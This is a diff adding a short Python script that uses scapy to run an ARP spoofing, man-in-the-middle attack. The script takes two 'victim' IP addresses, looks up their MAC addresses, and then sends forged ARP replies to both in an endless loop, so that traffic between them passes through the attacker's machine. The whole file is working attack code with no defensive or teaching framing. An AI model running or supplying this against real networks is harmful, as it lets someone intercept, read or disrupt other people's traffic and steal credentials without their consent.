@@ -1,0 +1,39 @@
+import scapy.all as scapy
+import time
+import argparse
+
+def parse():
+	parser = argparse.ArgumentParser()
+	parser.add_argument("--victim1", dest="victim1", help="first victim ip ")
+	parser.add_argument("--victim2", dest="victim2", help="second victim ip ")
+	opt=parser.parse_args()
+	victim1 = opt.victim1
+	victim2 = opt.victim2
+	return victim1, victim2
+
+def get_mac(target):
+	arp_req= scapy.ARP(pdst=target)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arp_req_broadcast = broadcast/arp_req
+	answered,unanswered =scapy.srp(arp_req_broadcast,timeout=1,verbose=False)
+	return(answered[0][1].hwsrc)
+
+
+
+
+def spoof(target_ip, spoofed_ip):
+	target_mac=get_mac(target_ip)
+	packet=scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoofed_ip)
+	scapy.send(packet,verbose=False)
+
+num=0
+victim1,victim2=parse()
+try:
+	while True:
+		spoof(victim1,victim2)
+		spoof(victim2,victim1)
+		num += 2
+		print("\r[+] sent "+ str(num)+ " packets",end=" ")
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("\n\nQuitting..........")
